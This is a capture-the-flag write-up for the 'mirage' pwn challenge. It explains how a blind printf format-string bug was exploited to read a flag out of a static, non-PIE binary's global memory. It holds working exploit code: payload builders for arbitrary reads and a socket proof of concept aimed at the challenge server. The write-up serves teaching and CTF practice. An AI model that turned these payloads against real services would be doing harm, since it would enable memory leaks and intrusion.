# mirage

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}`

---

## 1. Prompt analysis

Description:

> "An echo that repeats back a little more than you said."
> `nc 0.cloud.chals.io 23023`

The phrase "repeats back a **little more** than you said" is a textbook
description of a **printf format-string leak**: the service takes your input
and hands it straight to `printf()` **as the format string**, so `%p` / `%s`
make it print *extra* (uninitialised stack, memory at pointers).

No binary was shipped. The flag text itself (`bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry`)
confirms the intent: solve it **blind**, no `checksec`, no disassembly.

## 2. First contact

```
$ printf 'hello\n' | nc 0.cloud.chals.io 23023
> hello
>
```

Banner is literally just the prompt `"> "`. Every line is echoed back.

Feeding format specifiers immediately confirms the bug:

```
$ %p              -> 0x48725b
$ %x %x %x        -> 48725b 0 71
$ %s              -> quit
$ AAAA%p%p%p%p%p%p%p%p
      -> AAAA0x48725b(nil)0x71(nil)(nil)0x7025702541414141 0x7025702570257025 0x70257025
```

`0x7025702541414141` is little-endian `"AAAA%p%p"` - **our own input buffer,
which lives on the stack**. The repeating `0x70257025…` words are the
`%p` pattern repeating. Conclusion: classic stack-based format string, our
buffer starts at **argument index 6** (8-byte words).

An 8-byte-aligned sweep (`AAAAAAAA.%p.%p...`) revealed the memory layout:

```
idx 1  = 0x48725b            -> %s gives "quit"
idx 2  = (nil)
idx 3  = 0x71
idx 6..= our buffer bytes
idx 39 = 0x7ffe....           stack pointer
...    0x40xxxx / 0x487xxx / 0x489xxx / 0x4b5140   <- low, FIXED addresses
```

The `0x40…`/`0x48…`/`0x4b…` addresses are **not randomised** → the binary is a
**static, non-PIE** executable (statically linked glibc - later reads showed
buffers flags `0xfbad2887`, i.e. `_IO_2_1_stdout_`, and libc paths like
`/sysdeps/x86/dl-cacheinfo.h`). That means fixed global addresses are readable
without any ASLR leak.

## 3. Building a working arbitrary read

Naively placing the target address **first** fails:

```
payload = p64(addr) + "%6$s"
-> prints only the first bytes of addr, e.g. "[rH"
```

Reason: `p64(0x48725b)` = `5b 72 48 00 00 00 00 00`. printf reads the buffer as
a **C string**, so it stops at the first `0x00` and never reaches `%6$s`.

**Fix:** put the address **after** the format specifiers. The buffer starts at
argument index 6, so a pointer placed at buffer offset `OFF` is argument index
`6 + OFF/8`.

```python
OFF      = 64
IDX      = 6 + OFF//8          # 14
fmt      = b"%14$s"
payload  = fmt + b"B"*(OFF-len(fmt)) + p64(addr)
```

Verified against known data:

```
0x48725b  -> "quit"
0x489448  -> "[chall] mirage on 127.0.0.1:%d\n"
```

Arbitrary C-string read confirmed.

### Quirk: leading character is dropped

In the multi-reader we noticed the first byte of the payload never appears in
the output - the service effectively calls `printf(buf+1)` (or otherwise eats
the leading char). All argument indices are unaffected (they depend on buffer
position, not the format-string start), so we simply don't rely on the first
byte.

### Quirk: one line per TCP segment

The server reads with a single `read()` and only processes the **first line** of
a chunk; extra lines pipelined in the same `send()` are discarded:

```
send 6 lines at once  ->  only 1 response + prompt
```

So requests must be sent **one line at a time** and the prompt awaited.

## 4. Speeding up - multi-string read

printf accepts many positional specifiers in one format string, so one request
can read many addresses at once. Pointers are parked at buffer offset 256 →
argument indices 38, 39, 40, …:

```python
OFF, BASE_IDX = 256, 6 + OFF//8        # 38
fmt  = b"|".join(b"%%%d$s"%(BASE_IDX+i) for i in range(n)) + b"|"
payload = fmt + b"Z"*(OFF-len(fmt)) + b"".join(p64(a) for a in addrs)
```

Response is `s0|s1|...|s_{n-1}|` followed by the padding and raw address bytes.
Result: **~30 addresses per round trip, ~15 ms per address** - enough to sweep
whole memory regions in seconds.

## 5. Locating the flag

`flag.txt` is opened by the program at startup - its name sits in the binary's
own `.rodata`:

```
0x487258  "> "        (the prompt)
0x487260  "flag.txt"
```

The file is read into a **fixed global buffer in .bss**. Sweeping `.bss`
(`0x4b5000` - `0x4b7000`, stride 8) found it:

```
4b6ac0  isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}
4b6ac8  1nd_f0rmat_str1ng_h4s_n0_b1n4ry}
...
```

Direct re-read of neighbouring addresses (`0x4b6ab0`/`0x4b6ab8` are empty /
NUL) pins the string start exactly at `0x4b6ac0`:

```python
reads([0x4b6ab0, 0x4b6ab8, 0x4b6ac0, 0x4b6ac8])
# [b'', b'', b'isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}',
#  b'1nd_f0rmat_str1ng_h4s_n0_b1n4ry}']
```

Write primitives (`%n`) were never needed - the flag is simply **leaked out of
a global** through the arbitrary read.

## 6. Answer

```
isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}
```

## 7. Reproduction

```bash
cd ~/Downloads/ctfs/CRYOVAULT/mirage
python3 -c "from multi import reads; print(reads([0x4b6ac0]))"
# [b'isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}']
```

Minimal one-shot PoC (single request, no tooling):

```
python3 - <<'PY'
import socket,struct,time
s=socket.create_connection(("0.cloud.chals.io",23023)); s.settimeout(8)
time.sleep(1); s.recv(4096)
OFF=64; IDX=6+OFF//8; fmt=b"%" + str(IDX).encode() + b"$s"
s.sendall(fmt+b"B"*(OFF-len(fmt))+struct.pack("<Q",0x4b6ac0)+b"\n")
print(s.recv(4096).split(b"B")[0])
PY
```

## 8. Lessons / gotchas

1. **No binary ≠ no solve.** Blind format-string work: `%p` to map the stack,
   then identify non-randomised addresses to prove static/non-PIE.
2. **NUL bytes kill a format string.** Always place binary addresses *after* the
   specifiers; the format string is a C string.
3. **Multi-specifier reads** (`%38$s%39$s...`) turn a 1-read-per-RTT oracle into
   a ~30-read-per-RTT scanner.
4. **Interaction quirks matter**: here the server processes exactly **one line
   per TCP segment** and appears to drop the **leading character** of the line.
5. The flag itself was the hint: `bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry`.
